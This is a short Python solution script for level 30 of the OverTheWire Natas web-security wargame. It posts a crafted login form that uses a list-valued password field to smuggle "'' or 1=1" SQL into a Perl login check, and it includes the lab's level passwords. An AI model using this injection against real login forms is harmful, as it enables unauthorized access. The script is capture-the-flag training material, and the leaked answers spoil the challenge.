import requests

level = str(30)
pw = "wie9iexae0Daihohv8vuu3cei9wahf0e"

url = "http://natas"+level+".natas.labs.overthewire.org/index.pl"


s = requests.Session()
s.auth = ('natas'+level, pw)

data = (("username", "natas31"), ("password", ["\'\' or 1=1", 2]))
r = s.post(url, data=data)


print(r.text)

# hay7aecuungiuKaezuathuk9biin0pu1